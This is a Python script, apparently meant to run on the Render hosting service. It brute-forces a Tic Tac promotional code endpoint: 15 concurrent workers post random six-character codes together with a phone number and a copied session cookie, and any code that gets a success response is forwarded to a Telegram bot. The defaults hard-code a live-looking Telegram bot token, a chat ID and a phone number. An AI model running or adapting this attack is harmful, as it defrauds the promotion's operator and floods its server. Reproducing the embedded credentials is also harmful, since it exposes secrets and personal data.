import asyncio
import httpx
import random
import string
import time
import os
from aiohttp import web

# 🔑 ====== CONFIG — USES ENVIRONMENT VARIABLES ======
# On Render, set these in the "Environment" tab of your Dashboard
PHONE = os.getenv("PHONE", "7658898599")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8405739580:AAF2uGUA6qQQnJbFWfjpWPym0_7cmGNz4iY")
CHAT_ID = os.getenv("CHAT_ID", "5940816248")
PORT = int(os.getenv("PORT", 10000)) # Render provides the PORT variable
# ===================================================

URL = "https://www.tictac.com/in/en/xp/jarpecarpromo/home/generateOTP"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; I2219 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/143.0.7499.34 Mobile Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://www.tictac.com",
    "Referer": "https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "PHPSESSID=dqcn6p9tve1pv6f4llh7cla81p",
    "Sec-Ch-Ua": '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?1",
    "Sec-Ch-Ua-Platform": '"Android"',
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

counter = 0
valid_count = 0
start_time = time.time()

def gen_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def is_valid(r: httpx.Response) -> bool:
    if r.status_code != 200:
        return False
    try:
        j = r.json()
        return (
            j.get("status") == "success" or
            "otp" in j or
            ("message" in j and "sent" in j["message"].lower()) or
            j.get("valid") is True
        )
    except:
        return False

async def send_to_telegram(ccode: str):
    global valid_count
    try:
        async with httpx.AsyncClient(timeout=8) as c:
            await c.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": f"Valid Code Found: {ccode}"}
            )
        valid_count += 1
        print(f"\n✅ [{valid_count}] Sent to Telegram: {ccode}")
    except Exception as e:
        print(f"\n⚠️ Telegram error: {e}")

async def worker(client: httpx.AsyncClient, sem: asyncio.Semaphore):
    global counter
    while True:
        code = gen_code()
        async with sem:
            try:
                r = await client.post(
                    URL,
                    headers=HEADERS,
                    data={"phone": PHONE, "ccode": code},
                    timeout=5.0
                )
                counter += 1
                if counter % 50 == 0:
                    print(f"📈 Total: {counter} | Valid: {valid_count}")

                if is_valid(r):
                    await send_to_telegram(code)
            except Exception:
                pass

async def health_check_logic():
    while True:
        await asyncio.sleep(60)
        uptime = int(time.time() - start_time)
        print(f"[🔄 Health] Total: {counter} | Valid: {valid_count} | Uptime: {uptime}s")

# --- Render Compatibility: Web Server ---
async def handle(request):
    uptime = int(time.time() - start_time)
    return web.Response(text=f"Bot is running!\nTotal tried: {counter}\nValid found: {valid_count}\nUptime: {uptime}s")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"🌍 Web server started on port {PORT}")

async def main():
    print("♾️ Starting Render-optimized worker...")
    
    # Start web server so Render health checks pass
    await start_web_server()
    
    sem = asyncio.Semaphore(10) 
    async with httpx.AsyncClient(http2=True, timeout=6.0) as client:
        tasks = [worker(client, sem) for _ in range(15)]
        tasks.append(health_check_logic())
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
        
